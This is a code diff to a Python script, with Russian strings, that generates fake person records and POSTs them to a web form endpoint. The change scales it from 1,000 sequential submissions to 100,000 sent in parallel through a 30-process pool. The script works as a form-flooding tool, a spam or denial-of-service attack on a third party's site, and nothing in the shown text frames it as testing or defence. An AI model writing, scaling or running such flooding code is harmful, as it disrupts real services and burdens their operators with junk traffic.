@@ -1,6 +1,7 @@
 import random
 import json
 import requests
+from multiprocessing import Pool
 
 
 # PRIVET KRAKENU OT GEKSCHATA
@@ -62,6 +63,13 @@ def fakePerson():
     return json.dumps(result)
 
 
+def getArrData():
+    arr = []
+    while len(arr) < 100000:
+        arr.append(fakePerson())
+    return arr
+
+
 def yaNavojuNaVasGipnoz(data):
     dictData = json.loads(data)
     cookie = {
@@ -94,7 +102,7 @@ def yaNavojuNaVasGipnoz(data):
         r = requests.post(url, headers=headers, json=data, stream=True)
         code = r.status_code
         if code == 200:
-            print('Отправлено! ' + ' <|> ' + dictData['your-message'])
+            print('Отправлено! ' + ' <|> ' + str(dictData['your-message']))
         else:
             print('Мы в дерьме')
     except requests.exceptions.HTTPError as errh:
@@ -110,8 +118,11 @@ def yaNavojuNaVasGipnoz(data):
 if __name__ == '__main__':
     # checkFakePersonJSON
     # print(fakePerson())
-    cnt = 0
-    while cnt < 1000:
-        yaNavojuNaVasGipnoz(fakePerson())
-        cnt += 1
-        print(str(cnt) + ' запросов отправлено.')
+
+    with Pool(30) as pool:
+        pool.map(yaNavojuNaVasGipnoz, getArrData())
+    # cnt = 0
+    # while cnt < 1000:
+    #     yaNavojuNaVasGipnoz(fakePerson())
+    #     cnt += 1
+        # print(str(cnt) + ' запросов отправлено.')
